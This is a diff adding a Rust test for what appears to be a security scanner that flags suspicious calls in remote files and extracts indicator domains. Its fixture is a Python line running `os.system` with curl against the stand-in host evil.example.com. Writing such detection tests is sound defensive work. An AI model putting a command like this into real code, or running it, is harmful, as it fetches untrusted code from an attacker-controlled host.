@@ -926,4 +926,44 @@ mod tests {
 
         let _ = std::fs::remove_dir_all(&base);
     }
+
+    #[tokio::test(flavor = "multi_thread")]
+    async fn scan_remote_streams_events_and_stores_ast_and_indicators() {
+        let base = std::env::temp_dir().join(format!("exfil-remote-events-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&base);
+        let py = b"import os\nos.system('curl http://evil.example.com/x')\n".to_vec();
+        let mut files = std::collections::HashMap::new();
+        files.insert("/srv/app.py".to_string(), py);
+        let fs = MemoryFs {
+            host: "h".into(),
+            files,
+        };
+
+        let pipeline = default_pipeline().unwrap();
+        let store = Store::open_findings(&base).await.unwrap();
+        let (tx, rx) = std::sync::mpsc::channel();
+        let summary = scan_remote(&fs, "/srv", &pipeline, &store, Some(tx))
+            .await
+            .unwrap();
+        assert_eq!(summary.files, 1);
+        assert!(summary.matches >= 1, "os.system should be flagged");
+
+        // Progress events were streamed over the channel.
+        let events: Vec<_> = rx.into_iter().collect();
+        assert!(events.iter().any(|e| matches!(e, ScanEvent::Match(_))));
+        assert!(events.iter().any(|e| matches!(e, ScanEvent::FileDone)));
+
+        // The URL's domain was extracted into an indicators node.
+        let domains = store.indicator_domains().await.unwrap();
+        assert!(
+            domains
+                .iter()
+                .any(|(_, d)| d.iter().any(|x| x.contains("evil.example.com"))),
+            "{domains:?}"
+        );
+        // The python file's AST was stored.
+        assert!(!store.list_records("ast", 10).await.unwrap().is_empty());
+
+        let _ = std::fs::remove_dir_all(&base);
+    }
 }
